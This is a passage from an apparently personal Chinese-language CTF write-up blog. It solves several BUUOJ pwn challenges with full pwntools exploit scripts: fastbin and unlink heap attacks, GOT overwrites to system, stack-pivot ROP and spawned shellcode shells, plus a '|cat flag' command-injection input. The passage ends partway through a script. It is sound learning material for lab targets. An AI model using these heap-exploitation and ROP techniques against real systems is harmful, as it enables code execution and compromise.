class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28594</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y : sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">str</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index=<span class="built_in">int</span>, content=<span class="built_in">bytes</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Print</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#0  00</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#1  20</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#2  40</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#3  60</span></span><br><span class="line">add(<span class="number">0x90</span>)    <span class="comment">#4  80</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">fill(<span class="number">0</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#1</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2 in 4</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Print(<span class="number">2</span>)</span><br><span class="line">sh.recv(<span class="number">10</span>)</span><br><span class="line">data=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(data))</span><br><span class="line">main_arena_addr=data-<span class="number">88</span></span><br><span class="line">malloc_hook_addr=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">fake_fastbin=malloc_hook_addr-<span class="number">0x23</span>   <span class="comment">##size=7f</span></span><br><span class="line">libc_base=data-<span class="number">0x3C4B78</span></span><br><span class="line">add(<span class="number">0x90</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_fastbin)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">fill(<span class="number">8</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10 fake_fastbin</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span> </span><br><span class="line">pal=<span class="number">0x13</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fast===&gt;&quot;</span>,fake_fastbin)</span><br><span class="line">fill(<span class="number">10</span>,pal)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook===&gt;&quot;</span>,malloc_hook_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#3C4B78</span></span><br></pre></td></tr></table></figure><h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><p>虽然是一道很简单的题目，但是我一开始还真的没有做出来，记住malloc之后的堆块会清空</p><h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>这道题第一眼就比较神奇，因为他不能ida反编译，估计是花指令之类的，但是我不会，只能读汇编啦</p><p>就是一个shellcode，很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./mrctf2020_shellcode&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>这道题就是先格式字符串漏洞泄露canary，然后用puts(puts@got)来泄露libc基址</p><h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>这道题就是考察一个对于linux命令行的绕过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)dest = <span class="string">&#x27; gnip&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input the ip address:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">system(dest);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里就是输入<code>|cat flag</code>即可，关于这方面的内容我就写在另一篇md上了</p><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6020</span>C0:magic</span><br><span class="line"><span class="number">6020E0</span>:heap_array</span><br></pre></td></tr></table></figure><p>就是一个堆溢出</p><p>首先的思路肯定是覆盖一个大数字在magic上，然后就会想到unsortedbin attack，但是要已知fd，然后修改bk为<code>&amp;magic-0x10</code>，但是没有show类函数，搞不定？</p><p>那接下来就是unlink了，这个比较easy，简单说就是一个地址addr有chunk1的地址，然后修改chunk1的fd为addr-0x18，bk为addr-0x10，然后就显然了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25380</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span>(<span class="params"><span class="string">b&#x27;a&#x27;</span></span>)</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">magic_addr=<span class="number">0x6020C0</span></span><br><span class="line">heap_array=<span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">pal1=p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(heap_array-<span class="number">0x18</span>+<span class="number">0x10</span>)+p64(heap_array-<span class="number">0x10</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)</span><br><span class="line">pal2=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,pal2)</span><br><span class="line">edit(<span class="number">2</span>,pal1)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#2 为0x6020d8</span></span><br><span class="line">edit(<span class="number">2</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#edit(0,b&#x27;10000000&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里最有病的就是后门仅仅是提供一个system的符号表。</p><h3 id="二解-1"><a href="#二解-1" class="headerlink" title="二解"></a>二解</h3><p>​先申请3个堆块，index分别为0，1，2，然后释放chunk2，接着edit chunk1溢出,修改chunk1数据为&#x2F;bin&#x2F;sh(因为后面要delete chunk1 getshell)修改chunk2的fd为一处与heaparray数组接近的地方，因为这里可以错位偏移构造一个size为0x7f的fake_chunk，绕过malloc对fastbin chunk的检查，让它插进fastbins ，之后从新申请回fake_chunk，利用fake_chunk溢出修改heaparray[0]的值为free_got,最后edit chunk0(现在为free_got)为system_plt,然后delete(1)执行system(“&#x2F;bin&#x2F;sh”) getshell</p><p>​跟0ctf那题有异曲同工之妙，就是构造fake_fastbin</p><h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>首先本道题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在大多数操作系统中，BSS 段的权限通常是可读写（RW）的，但不可执行（E）。</p><p>所以显然就是栈迁移，有地方让我们写，然后到main里让我们得以凑齐两个leave_ret，从而可以实施</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;spwn&quot;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26209</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">s_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">ret_addr=<span class="number">0x08048312</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(s_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr=&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;write&quot;,write_addr)</span></span><br><span class="line"><span class="comment">#libc_base=write_addr-libc.dump(&quot;write&quot;)</span></span><br><span class="line"><span class="comment">#print(&quot;libc_base=&quot;,end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line">libcbase = write_addr - <span class="number">0x0d43c0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x3a940</span></span><br><span class="line">binsh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(ret_addr)+p32(system_addr)+p32(main)+p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这道题让我感觉很奇怪，因为我用libcsearcher找的libc不能用，但是我用网上找的偏移确实正确的</p><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这道题用的是int 80的系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int80(<span class="number">11</span>,<span class="string">&quot;/bin/sh&quot;</span>,null,null)</span><br></pre></td></tr></table></figure><p>　　后面的四个参数分别是<strong>eax</strong>、<strong>ebx</strong>、<strong>ecx</strong>、<strong>edx</strong>。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>改堆的free函数为system@plt，然后再改内容为&#x2F;sh，应该是可以getshell的，但是不知道为什么调试一直显示共享库损坏，就不写了</p><p>strchr寻找字符出现的地方</p><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>首先是一个off-by-null的漏洞</p><p>那么应该是一个unlink然后通过unlink后的堆块，来改一个结构堆块的内容为free@got，之后改这个内容的内容堆块，即改free@go表为system然后再传入一个&#x2F;bin&#x2F;sh\x00就行了</p><p>但是我看了wp，发现我的思路有点过于复杂了，他的des的大小判断是根据堆块越界来看的，我们可以不让结构堆块和des堆块连在一起，就能实现越界到另一个结构堆块上</p><p>可以通过show函数来泄露libc基址，就越界覆盖一个free@got来show</p><h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h2><p>冷知识：calloc不会从tcachebin里面取堆块</p><p>​首先大概的思路是先泄露libc基址，这个可以通过show unsortedbin来泄露，再泄露heap基址，之后便是构造<code>tcache stashing unlink attack</code>，之后再修改<code>__malloc_hook</code>为add rsp###,ret然后在栈中构造ROP链</p><p>​仔细说一下tcache的unlink attack，它是先申请相同size的两个smallbin和tcachebin，然后再用calloc拿掉一个smallbin的时候会将剩下的smallbin放进tcachebin里，而且其中几乎没有什么check，那么我们就可以在拿取之前将smallbin的bk改成目标地址，但是要保证fd链是正确的，就可以在target-0x10上覆盖一个地址，算是大数组，也可以字节错位来实现一些小目标</p><h3 id="首先这题有几个问题"><a href="#首先这题有几个问题" class="headerlink" title="首先这题有几个问题"></a>首先这题有几个问题</h3><h3 id="magic函数的判定寻找过程"><a href="#magic函数的判定寻找过程" class="headerlink" title="magic函数的判定寻找过程"></a>magic函数的判定寻找过程</h3><p>首先是<code>qword_4030</code>是位于bss段上的，那么vmmap上找第一个RW段，就是bss段，然后以基址往后30就是该值，之后+0x20即在这个地址上的值加上0x20</p><h3 id="还有tcache结构堆块的结构"><a href="#还有tcache结构堆块的结构" class="headerlink" title="还有tcache结构堆块的结构"></a>还有tcache结构堆块的结构</h3><p>tcache结构是第一个malloc或calloc的堆块的时候初始化形成的，首先是couts数组，然后才是tcache堆，而这个couts的存储大小有1字节和2字节之分，区分于版本的大小，在较低版本都是1字节，较高版本是2字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 